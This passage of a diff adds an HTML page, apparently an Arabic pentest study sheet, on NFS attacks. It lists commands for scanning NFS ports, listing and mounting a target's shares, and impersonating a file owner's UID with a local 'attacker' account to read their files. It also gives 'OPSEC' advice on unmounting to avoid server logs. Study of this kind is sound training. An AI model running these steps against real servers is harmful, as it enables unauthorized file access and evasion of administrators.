+        <div class="code-block" style="margin-top:6px;"><span class="cmd">sudo nmap --script nfs* -p111,2049 -sV TARGET</span></div>
+        <div class="alert info" style="margin-top:6px;">👀 ports عشوائية (mountd) = NFSv3 = auth ضعيف</div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">2</div>
+      <div class="method-content">
+        <div class="method-title">showmount — شوف الـ Shares</div>
+        <div class="method-desc">قائمة الـ shares المتاحة ومن يقدر يوصلها</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">showmount -e TARGET</span></div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">3</div>
+      <div class="method-content">
+        <div class="method-title">Mount الـ Share</div>
+        <div class="method-desc">وصّل الـ share على جهازك</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">mkdir target-NFS
+sudo mount -t nfs TARGET:/ ./target-NFS/ -o nolock</span></div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">4</div>
+      <div class="method-content">
+        <div class="method-title">شوف UID/GID</div>
+        <div class="method-desc">حدد الأرقام لكل ملف</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">ls -n target-NFS/mnt/nfs/</span></div>
+        <div class="alert danger" style="margin-top:6px;">
+          ركز على:<br>
+          UID 0 = root → id_rsa = SSH access<br>
+          UID 1000+ = users عاديين → ملفاتهم الشخصية
+        </div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">5</div>
+      <div class="method-content">
+        <div class="method-title">UID Impersonation</div>
+        <div class="method-desc">اصنع يوزر بنفس الـ UID واقرأ الملفات</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">sudo useradd -u 1000 attacker && sudo su attacker</span></div>
+      </div>
+    </div>
+    <div class="method-step">
+      <div class="method-num">6</div>
+      <div class="method-content">
+        <div class="method-title">Unmount بعد ما تخلص</div>
+        <div class="method-desc">أوقف تسجيل اتصالك — OPSEC مهم!</div>
+        <div class="code-block" style="margin-top:6px;"><span class="cmd">sudo umount ./target-NFS</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🧠 قواعد التفكير</div>
+    <div class="grid-2">
+      <div style="background:#010409;border:1px solid var(--border2);padding:12px;">
+        <div style="color:var(--cyan);font-size:11px;margin-bottom:8px;">✅ دايماً افعل:</div>
+        <div style="font-size:11px;line-height:1.8;color:var(--text2);">
+          • شوف الـ UID/GID بـ ls -n<br>
+          • دور على id_rsa أول شي<br>
+          • تحقق من no_root_squash<br>
+          • umount بعد ما تخلص
+        </div>
+      </div>
+      <div style="background:#010409;border:1px solid var(--border2);padding:12px;">
+        <div style="color:var(--red);font-size:11px;margin-bottom:8px;">⚠️ انتبه:</div>
+        <div style="font-size:11px;line-height:1.8;color:var(--text2);">
+          • root_squash = root محمي<br>
+          • NFSv4 + Kerberos = أصعب<br>
+          • NFSv3 = هدف سهل<br>
+          • * في exports = أي IP مسموح
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- EXPLAINED Q&A -->
+<div id="panel-explained" class="tab-panel">
+  <div class="section-header"><div class="section-title">Explained — Q&A</div><div class="section-header-line"></div></div>
+
+  <div class="card">
+    <div class="card-title">🌐 الأساسيات</div>
+    <div class="convo">
+      <div class="convo-q">إيش الفرق بين NFS وSMB؟</div>
+      <div class="convo-a">نفس الفكرة — مشاركة ملفات عبر الشبكة. الفرق في نظام التشغيل: SMB لـ Windows (وLinux عبر Samba)، NFS لـ Linux وUnix فقط. NFS clients ما يقدرون يتكلموا مع SMB servers مباشرة.</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">ما هو mount؟</div>
+      <div class="convo-a">mount = توصيل مصدر بيانات بمجلد محلي. مثل كابل USB بس عبر الشبكة. بعد الـ mount تتصفح ملفات السيرفر البعيد كأنها على جهازك محلياً.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔑 UID/GID</div>
+    <div class="convo">
+      <div class="convo-q">ليش NFS يستخدم أرقام UID/GID بدل أسماء؟</div>
+      <div class="convo-a">لأن الأسماء ممكن تتكرر — "admin" على السيرفر يختلف عن "admin" على جهازك. الأرقام فريدة ودقيقة. UID 1000 = نفس المعنى على أي جهاز.</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">كيف تستغل الـ UID في الـ pentest؟</div>
+      <div class="convo-a">بعد mount الـ share، تشوف الـ UID بـ ls -n. بعدين تصنع يوزر على جهازك بنفس الـ UID. NFS يحسبك نفس الشخص! تقدر تقرأ ملفاته كاملة.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">⚙️ الإعدادات</div>
+    <div class="convo">
+      <div class="convo-q">إيش يعني root_squash؟</div>
+      <div class="convo-a">يحمي السيرفر من root على الـ client. لو أنت root على جهازك، NFS يحولك لـ anonymous (UID 65534) — ما تقدر تعدل ملفات root على السيرفر. no_root_squash = العكس = خطر!</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">إيش يعني * في /etc/exports؟</div>
+      <div class="convo-a">wildcard = أي IP على الشبكة أو الإنترنت مسموح له. لو مع rw وno_root_squash = أخطر إعداد ممكن. أي شخص في العالم يقدر يـ mount ويعدل!</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">إيش -o nolock في الـ mount؟</div>
+      <div class="convo-a">يقول للسيرفر "ما أحتاج خدمة file locking". يضمن نجاح الـ mount حتى مع سيرفرات قديمة أو مقيدة. في الـ pentest أنت بس تقرأ — ما تحتاج locking أصلاً.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔒 Kerberos و NFSv4</div>
+    <div class="convo">
+      <div class="convo-q">إيش هو Kerberos؟</div>
+      <div class="convo-a">نظام مصادقة يستخدم تذاكر مشفرة (TGT) بدل باسوردات. تثبت هويتك مرة واحدة لـ Kerberos Server → يعطيك TGT → تستخدمه للدخول لأي خدمة. ما في باسورد يمشي على الشبكة أبداً!</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">ليش ports عشوائية تعني NFSv3؟</div>
+      <div class="convo-a">NFSv3 يحتاج portmapper (111) + mountd (عشوائي) + nlockmgr (عشوائي). NFSv4 ألغى كل هذا وصار يشتغل على Port 2049 فقط. لو شفت ports عشوائية في nmap = NFSv3 مؤكد.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">🎯 OPSEC</div>
+    <div class="convo">
+      <div class="convo-q">ليش مهم تعمل umount بعد ما تخلص؟</div>
+      <div class="convo-a">لو تركت الـ mount مفتوح، السيرفر يسجل اتصالك في الـ logs دايماً. المسؤول يشوفك! كمان أي تعديل بالخطأ يؤثر على السيرفر مباشرة. umount = تنظيف آثارك.</div>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script>
+function showPanel(name,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('panel-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+function showTool(name,btn){
+  document.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tool-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tool-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+</body>
+</html>
